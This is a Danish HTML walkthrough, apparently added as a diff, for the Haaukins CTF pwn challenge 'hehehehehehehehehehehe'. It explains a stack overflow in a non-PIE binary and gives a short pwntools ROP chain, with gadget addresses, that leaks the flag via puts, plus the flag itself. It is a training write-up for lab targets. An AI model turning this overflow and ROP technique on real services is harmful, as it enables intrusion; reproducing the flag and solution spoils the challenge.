@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: hehehehehehehehehehehe, tutorial (læs flaget fra .data i stedet for at bygge en shell)</title>
+<meta name="description" content="Guide til Haaukins hehehehehehehehehehehe: et stack-overflow giver ROP, men flaget er allerede indlæst i binærens globale .data på en fast adresse. En simpel puts-leak-primitiv læser det direkte, uden en ret2libc-shell.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/hehehehe.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: hehehehehehehehehehehe, tutorial (læs flaget fra .data i stedet for at bygge en shell)">
+<meta property="og:description" content="Guide til Haaukins hehehehehehehehehehehe: et stack-overflow giver ROP, men flaget er allerede indlæst i binærens globale .data på en fast adresse. En simpel puts-leak-primitiv læser det direkte, uden en ret2libc-shell.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/hehehehe.html">
+<meta property="og:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://lolcatatonia.github.io/haaukins-walkthroughs/assets/og-default.png">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "hehehehehehehehehehehe", "description": "Guide til Haaukins hehehehehehehehehehehe: et stack-overflow giver ROP, men flaget er allerede indlæst i binærens globale .data på en fast adresse. En simpel puts-leak-primitiv læser det direkte, uden en ret2libc-shell.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/hehehehe.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+<script src="assets/gloss.js" defer></script>
+<script src="assets/hire-widget.js" defer></script>
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>hehehehehehehehehehehe</h1>
+<p class="subtitle">Når flaget ligger i processens egen hukommelse, er en læsning nok. Byg ikke en shell du ikke har brug for.</p>
+<div class="badges"><span class="badge cat">Pwn</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Programmet: hvad gør det?</h2>
+<ol class="steps">
+<li><strong>Forbind og læs opførslen.</strong> <code><span class="gloss" tabindex="0" data-tip="Netcat: rå TCP/UDP-forbindelser fra kommandolinjen, netværkets svenske kniv.">nc</span> hehehehehehehehehehehe.hkn 1337</code> er
+single-shot: et banner (<em>"...So i made this platform"</em>), så læser den input, laver et
+leetspeak-echo (<code>a&rarr;4, e&rarr;3, o&rarr;0</code>, kun på ren tekst, ikke på binære bytes),
+siger <code>Goodbye</code> og afslutter.</li>
+<li><strong>Find overflowet.</strong> Input-læsningen løber over bufferen. Afstanden fra bufferen til
+gemt RIP er <strong>72 bytes</strong>, bestemt black-box med et cyklisk mønster. Binæren er en
+non-PIE 64-bit ELF med base <code>0x400000</code>, så alle adresser er faste.</li>
+<li><strong>Navnet er et hint.</strong> Flaget hedder senere <code>brop</code> (Blind ROP), opgavens
+tiltænkte teknik. Men den tiltænkte teknik er ikke altid den simpleste der virker, som vi skal se.</li>
+</ol>
+<h2>Primitivet: en arbitrær-læsning, ikke en shell</h2>
+<p>Med 72 bytes til gemt RIP og faste adresser kan vi bygge en kort ROP-kæde hvis
+eneste formål er at læse hukommelse. Byggeklodserne (fundet black-box) er:</p>
+<pre><code>offset   = 72
+pop rdi; ret = 0x40130b      # sæt første argument
+puts@plt     = 0x401030      # puts(rdi) printer en null-termineret streng
+stop-addr    = 0x400ae0      # et sted der standser pænt efter leaket</code></pre>
+<p>Kæden <code>A*72 + pop_rdi + &lt;addr&gt; + puts@plt + &lt;stop&gt;</code> kalder
+<code>puts(addr)</code> og printer dermed hukommelsen på <code>addr</code> frem til første nul-byte.
+Det er en ren LÆSE-primitiv. Den kan ikke eksekvere noget, den afslører kun bytes der allerede ligger
+i processen.</p>
+<h2>Den afgørende indsigt: non-PIE betyder at flaget har en fast adresse</h2>
+<p>Her er pointen der gør opgaven triviel. Binæren er non-PIE, så <code>.data</code> og
+<code>.bss</code> ligger på faste, kendte adresser. Programmer loader ofte flaget ind i en global
+buffer ved opstart. Hvis det er tilfældet her, behøver vi ikke nogen libc, ingen shell og ingen
+anden forbindelse, kun at pege læse-primitiven på det rigtige sted.</p>
+<p>Så i stedet for at bygge en exploit, scanner vi det statiske data-område (<code>0x403000</code>
+til ca. <code>0x405800</code>) med puts-primitiven og ser efter flag-formatet i det der kommer
+tilbage. Flaget lå på <code>0x403008</code>.</p>
+<h2>Løsningen</h2>
+<p>Hele løsningen er den ene læsning mod den fundne adresse:</p>
+<pre><code>from pwn import remote, p64, context
+context.log_level = 'error'
+
+r = remote('hehehehehehehehehehehe.hkn', 1337)
+r.recvuntil(b'platform\n')
+r.sendline(b'A'*72 + p64(0x40130b) + p64(0x403008) + p64(0x401030) + p64(0x400ae0))
+print(r.recvline())
+# puts(0x403008) -> DDC{brop_brop_brop_brop_brop_brop_brop}</code></pre>
+<p>Ingen ret2libc, ingen shell. Flaget stod i processens eget data-segment hele tiden.</p>
+<h2>Hvorfor en shell var en blindgyde</h2>
+<p>Den tiltænkte (og meget sværere) vej var en fuld ret2libc-shell, og det er let at
+rende sig fast dér. To konkrete fælder er værd at kende, fordi de to minutter de koster er de
+samme to minutter det tager at indse at man ikke behøver en shell:</p>
+<ul>
+<li><strong>Per-forbindelse-ASLR.</strong> Hvis du leaker libc i én forbindelse og så exploiter i en
+NY forbindelse, har processen en anden base, og dit leak er ugyldigt. Et ægte to-trins skal ske i
+SAMME forbindelse (fx via en return-to-main-adresse så programmet læser input igen).</li>
+<li><strong>Forkert libc eller seccomp.</strong> Serverens libc matchede ingen af de oplagte
+kandidater, og <code>system</code>/<code>one_gadget</code> fejlede begge, sandsynligvis et
+seccomp-filter der blokerer <code>execve</code>.</li>
+</ul>
+<p>Begge var fuldstændig irrelevante, fordi flaget aldrig krævede kodeeksekvering. En læse-primitiv
+er en strengt mindre evne end en shell, og her var den mindre evne rigeligt.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">DDC{brop_brop_brop_brop_brop_brop_brop}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><strong>Med en læse-primitiv på en non-PIE binær: scan .data/.bss for flaget FØR du bygger en ret2libc-kæde.</strong> Faste adresser betyder at en global buffer har en kendt placering, og flaget er ofte loadet derind ved opstart. En enkelt <code>puts</code>-leak kan afslutte opgaven uden en eneste linje shell-kode.</li><li><strong>Vælg den mindste primitiv der er tilstrækkelig.</strong> At læse hukommelse er en strengt mindre evne end at poppe en shell. Spørg altid hvad du FAKTISK har brug for: skal flaget bare læses, er en arbitrær-læsning nok, og den undgår en hel klasse af forhindringer (libc-matching, seccomp, one_gadget-betingelser).</li><li><strong>Per-forbindelse-ASLR kræver et to-trins i SAMME forbindelse.</strong> Et leak i én forbindelse er værdiløst i en ny, fordi basen skifter. En return-to-main lader programmet læse input igen, så leak og brug sker mod samme base.</li><li><strong>Et opgavenavn kan pege på den TILTÆNKTE teknik, ikke den nemmeste.</strong> "brop" hintede Blind ROP, men den simple læse-primitiv løste opgaven hurtigere. Lad hintet inspirere, men lad være med at tvinge den dyre vej hvis en billigere virker.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Princippet "læs frem for at eksekvere" rækker langt ud over denne opgave. Når
+et flag, en nøgle eller en hemmelighed allerede ligger i en proces' hukommelse, er en arbitrær-læsning
+(et format-string-leak, en out-of-bounds-read, en puts-leak som her) ofte den korteste vej, og den
+undgår alt besværet med at opnå kodeeksekvering. Non-PIE-binærer gør det særligt let, fordi globale
+buffere har faste adresser. Se <a href="ice-cream-overflow.html">Ice Cream Overflow</a> for et stack-overflow
+i en enklere form, og <a href="postsyd.html">Postsyd</a> samt <a href="set-user-id-hardcore.html">Set User ID</a>
+for ROP hvor målet derimod ER kodeeksekvering. Kontrasten er hele lektien: afgør hvad du har brug for,
+før du bygger det dyreste værktøj.</p>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
+er en dansk undervisningsplatform til sikkerhedstræning (AAU, De Danske Cybermesterskaber). Alle opgaver
+løses på platformens egne, formålsbyggede lab-miljøer, aldrig på andres systemer. Guiden forudsætter du selv
+har autoriseret adgang (fx som studerende eller deltager) og er løsningsstøtte til at lære metoden, ikke en
+genvej uden om selv at forstå den.
+</footer>
+</div>
+<aside id="hire-widget">
+<button class="hw-close" type="button" aria-label="Luk">×</button>
+<p>👋 Håber det her hjalp!</p>
+<p>For langhåret til dig? Overvej at ansætte ham der skrev det.</p>
+<a class="hw-link" href="https://www.linkedin.com/in/alexandermangaard/en" target="_blank" rel="noopener">LinkedIn →</a>
+</aside>
+</body>
+</html>
